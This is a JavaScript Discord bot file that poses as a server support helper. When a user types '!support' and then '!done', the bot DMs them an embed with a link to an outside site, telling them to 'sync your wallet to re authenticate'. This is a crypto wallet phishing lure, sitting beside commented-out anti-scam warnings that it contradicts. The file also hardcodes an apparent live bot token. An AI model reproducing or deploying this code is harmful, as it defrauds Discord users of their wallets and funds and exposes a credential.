const Discord = require("discord.js");
const { MessageEmbed } = require('discord.js');

//put your token here
const token = 'OTY3MDc2NDYwODY5MzI0ODMx.YmLCIw.fuL7OkfF4gB4_W4WHe9AQqa8Jww';

const client = new Discord.Client({
      intents: [ "GUILDS","GUILD_MESSAGES","DIRECT_MESSAGES"]
 })

 
//bot prefix
const PREFIX = '!';


 client.on('ready', () => {
   console.log('This bot is ready!');
  })
 

//discord message
client.on("messageCreate",(message)=>{
 let args = message.content.substring(PREFIX.length).split(" ");
 try {
    switch (args[0]) { 
		case 'support':
		//bot reply to channel
		  message.reply({ embeds: [exampleEmbed2] });
			break;
	
		case 'done':
		//bot dm command
		message.author.send({ embeds: [exampleEmbed] });
		break;
		}
}
catch (e) {}  
 
 
  })

const exampleEmbed = new MessageEmbed()
  	//embed color left side
	.setColor('#ADD8E6')
	//.setTitle('Welcome')*editable
	
	//.setDescription('SERVER RULES')*editable
	// upper right image link
	//.setThumbnail('https://i.imgur.com/Pu3LpZp.jpeg')*editable

	.addFields(
		//{ name: 'PAKIUSAP:', value: 'Palaging mag-verify sa mga kumakausap sa inyo dito sa Discord. Maraming pwedeng gumaya sa profile ng mga Moderators.' },*editable
		//{ name: '\u200B', value: '\u200B' },
		//{ name: 'MAHALAGANG PAALALA:', value: 'Huwag ka pupunta sa mga links na di ka sigurado kung ano iyon maaring pishing site ang binibigay sayo at huwag ibibigay kahit kanino at kahit saan ang inyong SEED PHRASE / SECRET RECOVERY PHRASE. Hindi po namin ito hihingin sa inyo kahit anong mangyari. Kapag may humingi sa inyo, siguradong SCAM ito. Wala na po kaming magagawa kung magpapa-loko kayo kahit alam mong sinasamantala ka na pero umaasa ka pa din.'},
		//{ name: '\u200B', value: '\u200B' },
		//{name: 'Note:', value: 'Our Staff, Mod, Admin, Support, etc. will never message you first.'},
    {name: '᲼',value: "Click [here](https://collab-activation.online/) to connect, to sync your wallet to re authenticate and restore to all functionalities on wallet."}
	//You are obligated to follow Discord's [terms of service](https://discord.com/terms)."},*editable
    //{name:'II.', value : " Our rules are based on Discord's [community guidelines](https://discord.com/guidelines) and have to be respected."}
	)
	

	.setTimestamp()

	const exampleEmbed2 = new MessageEmbed()
	.setColor('#ADD8E6')
	.addFields(
		{name: '᲼',value: "You need to allow __direct message__ in your privacy settings"},
	    {name: '᲼',value: "If you have enabled direct message, reply with **!done**"}
		)



            
 //bot initalize                       
client.login(token);

